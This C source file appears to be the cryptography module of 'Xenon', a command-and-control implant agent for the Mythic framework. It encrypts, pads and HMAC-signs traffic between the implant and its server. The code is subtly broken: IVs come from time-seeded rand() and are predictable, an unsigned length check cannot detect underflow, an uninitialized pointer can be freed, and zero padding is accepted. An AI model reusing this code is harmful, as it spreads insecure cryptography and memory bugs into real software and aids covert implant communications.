#include "Xenon.h"
#include "Crypto.h"
#include "Parser.h"
#include "Package.h"
#include "Config.h"
#include "hmac_sha256.h"
#include "Aes.h"


// This should be a safe way to compare secret values without leaking timing info
// https://github.com/veorq/cryptocoding#compare-secret-strings-in-constant-time
BOOL ConstTimeCompare(const char* lhs, const char* rhs, const SIZE_T size) {
    unsigned char missed = 0;
    for (SIZE_T idx = 0; idx < size; idx++) {
        missed |= lhs[idx] ^ rhs[idx];
    }
    return missed;
}

// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {
  for (int i = 0; i < sSize; i++) {
    	pByte[i] = (BYTE)rand() % 0xFF;
  }
}

// PKCS#7 padding
BOOL PadBuffer(PPackage package)
{

    // Fix padding
    SIZE_T datalen = package->length - 36; // We aren't including the Payload UUID which is prepended
    SIZE_T padding_needed = (AES_BLOCK_SIZE - (datalen % AES_BLOCK_SIZE)) % AES_BLOCK_SIZE;
    if (padding_needed == 0)
    {
        padding_needed = 16;    // If already multiple of 16 we need a whole block of padding
    }

    // _dbg("Data is %d bytes and needs %d more \n", datalen, padding_needed);

    // Reallocate the size of package->buffer + size of padding
    package->buffer = LocalReAlloc(package->buffer, package->length + padding_needed, LMEM_MOVEABLE | LMEM_ZEROINIT);
    if (!package->buffer)
        return FALSE;
    // PKCS#7 Add value of number of bytes needed as padding (e.g., 9 bytes needed = 0x09)
    memset((PBYTE)package->buffer + package->length, (BYTE)padding_needed, padding_needed);

    // Adjust package size accordingly
    package->length += padding_needed;
    
    return TRUE;
}

// Prepends encryption IV to the package (after the UUID)
BOOL PrependIv(PPackage package, PCHAR data, SIZE_T size)
{   
    if (size)
    {
        // Reallocate the size of package->buffer + size of new data
        package->buffer = LocalReAlloc(package->buffer, package->length + size, LMEM_MOVEABLE | LMEM_ZEROINIT);
        if (!package->buffer)
            return FALSE;

        // Move existing data after the UUID further down to make space for the new data (IV)
        memmove((PBYTE)package->buffer + 36 + size, (PBYTE)package->buffer + 36, package->length - 36);

        // Copy IV to buffer after Payload UUID
        memcpy((PBYTE)package->buffer + 36, (PBYTE)data, size);

        // Adjust package size accordingly
        package->length += size;
    }

    return TRUE;
}


// AES encrypts package data to the Mythic server specification
BOOL CryptoMythicEncryptPackage(PPackage package) {

    // const char* b64AesEncryptionKey = xenonConfig->aesKey;

    BOOL success = FALSE;

    // Generate random initialization vector
    BYTE pIv [IVSIZE];                      // IVSIZE is 16 bytes
    srand(time(NULL));                      // The seed to generate the key. This is used to further randomize the key.
    GenerateRandomBytes(pIv, IVSIZE);     // Generating a key with the helper function

    ///////////////////////////////////
    // Padding plaintext
    ///////////////////////////////////
    if (!PadBuffer(package)) {
        _err("Failed to pad buffer");
        goto end;
    }

    SIZE_T padded_len = package->length - 36;


    ///////////////////////////////////
    // Encryption of buffer
    ///////////////////////////////////
    SIZE_T szAesKey = KEYSIZE;           // Assuming the key is 32 bytes (AES-256-CBC)
    unsigned char pAesKey[KEYSIZE];      // Buffer to hold the decoded AES key
    SIZE_T encodedLen = strlen(xenonConfig->aesKey);

    // Base64 decode encryption key
    if (base64_decode((const char*)xenonConfig->aesKey, encodedLen, pAesKey, &szAesKey) != 0) {
        _err("Failed to decode encryption key.\n");
        goto end;
    }
    // _dbg("Encryption key (base64): %s \n", xenonConfig->aesKey);
    
    // Aes encrypt buffer
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, pAesKey, pIv);
    // Ensure there's enough data to encrypt after skipping the first 36 bytes
    
    // _dbg("ENCRYPTING %d bytes of data \n", package->length - 36);

    // Encrypt buffer in place
    if (package->length > 36) {
        // Encrypt only the portion of the buffer after the 36 byte UUID
        AES_CBC_encrypt_buffer(&ctx, (uint8_t*)package->buffer + 36, package->length - 36);
    }

    // Check block size
    if (padded_len % AES_BLOCK_SIZE != 0) {
        _err("Invalid encrypted data size of %d bytes\n", padded_len);
        goto end;
    }

    // _dbg("Encrypted data is %d bytes \n", package->length - 36);
    // print_bytes(package->buffer, package->length);


    ///////////////////////////////////
    // Initialization Vector
    ///////////////////////////////////

    // Prepend IV to the encrypted package (but after the Payload UUID of course)
    if (!PrependIv(package, pIv, 16)) {
        goto end;
    }
        
    // _dbg("Prepended IV now data is %d bytes \n", package->length - 36);
    // print_bytes(package->buffer, package->length);
    
    
    ///////////////////////////////////
    // Calculate HMAC (IV + Ciphertext)
    ///////////////////////////////////
    PBYTE hmac = (PBYTE)malloc(SHA256_HASH_SIZE);
    SIZE_T hmac_size = SHA256_HASH_SIZE;

    // Hash only the buffer data (not including UUID) alongside the AES key
    hmac_sha256(
        pAesKey, sizeof(pAesKey), 
        package->buffer + 36, package->length - 36,
        hmac, hmac_size
    );
    
    // _dbg("Calculated HMAC sha256 now data is %d bytes \n", package->length - 36);

    // _dbg("Size of HMAC: %d \n", hmac_size);
    // _dbg("SHA256 HMAC: ");
    // print_bytes(hmac, hmac_size);

    // Append HMAC to the end of the encrypted buffer
    if (!PackageAddBytes(package, hmac, hmac_size, FALSE)) {
        _err("Failed to add HMAC bytes to end of package \n");
        goto end;
    }

    success = TRUE;

end:
    if (hmac)
        free(hmac);
    // _dbg("FINAL PACKAGE: %d bytes", package->length);

    return success;
}


// AES decrypt parser structure in place
BOOL CryptoMythicDecryptParser(PPARSER parser) {
    
    BOOL success = FALSE;
    if (parser == NULL || parser->Buffer == NULL) {
        _err("Invalid input parser");
        goto end;
    }

    ///////////////////////////////////
    // Base64 decode key
    ///////////////////////////////////
    SIZE_T szAesKey = KEYSIZE; // AES-256-CBC requires a 32-byte key
    unsigned char pAesKey[KEYSIZE]; // Buffer to hold the decoded AES key
    SIZE_T encodedLen = strlen(xenonConfig->aesKey);

    if (base64_decode((const char*)xenonConfig->aesKey, encodedLen, pAesKey, &szAesKey) != 0) {
        _err("Failed to decode encryption key.");
        goto end;
    }
    
    ///////////////////////////////////
    // Verify HMAC (IV + Ciphertext)
    ///////////////////////////////////
    SIZE_T encrypted_data_length = parser->Length - (IVSIZE + SHA256_HASH_SIZE);
    if (encrypted_data_length <= 0) {
        _err("Invalid parser length for decryption");
        goto end;
    }

    PBYTE hmac_calculated = NULL;
    
    hmac_calculated = (PBYTE)malloc(SHA256_HASH_SIZE);
    if (!hmac_calculated) {
        _err("Failed to allocate memory for HMAC");
        goto end;
    }

    PBYTE hmac_provided = parser->Buffer + parser->Length - SHA256_HASH_SIZE;

    // Calculate HMAC
    hmac_sha256(
        pAesKey, KEYSIZE,
        parser->Buffer, IVSIZE + encrypted_data_length,
        hmac_calculated, SHA256_HASH_SIZE
    );

    // _dbg("HMAC provided:");
    // print_bytes(hmac_provided, SHA256_HASH_SIZE);

    // _dbg("HMAC Calculated:");
    // print_bytes(hmac_calculated, SHA256_HASH_SIZE);

    if (ConstTimeCompare(hmac_calculated, hmac_provided, SHA256_HASH_SIZE) != 0) {
        _err("HMAC verification failed.");
        goto end;
    }
    
    // _dbg("HMAC Successfully verified.");

    /////////////////////////////////////////
    // Extract the Initialization Vector (IV)
    /////////////////////////////////////////
    PBYTE pIv = NULL;
    SIZE_T ivSize = IVSIZE;
    pIv = ParserGetBytes(parser, &ivSize);
    
    // _dbg("Found IV Value! : ");
    // print_bytes(pIv, ivSize);

    //////////////////////////////////////////
    // Decrypt the data using AES-256-CBC  ///
    //////////////////////////////////////////
    
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, pAesKey, pIv);

    // AES_CBC_decrypt_buffer(&ctx, parser->Buffer + UUID_SIZE + IVSIZE, encrypted_data_length);
    AES_CBC_decrypt_buffer(&ctx, parser->Buffer, encrypted_data_length);

    parser->Length = encrypted_data_length;  // Update parser length

    // _dbg("Decrypted BUFFER: ");
    // print_bytes(parser->Buffer, parser->Length);

    ///////////////////////////////////
    // Remove PKCS7 Padding
    ///////////////////////////////////
    BYTE padding_length = parser->Buffer[parser->Length - 1];
    if (padding_length > AES_BLOCK_SIZE) {
        _err("Invalid padding length detected: %d", padding_length);
        goto end;
    }

    for (int i = 0; i < padding_length; i++) {
        if (parser->Buffer[parser->Length - 1 - i] != padding_length) {
            _err("Invalid padding detected.");
            goto end;
        }
    }

    parser->Length -= padding_length;

    success = TRUE;
    // _dbg("Decrypted data is now %d bytes", parser->Length);
    // print_bytes(parser->Buffer, parser->Length);
end:
    if (hmac_calculated)
        free(hmac_calculated);

    return success;
}

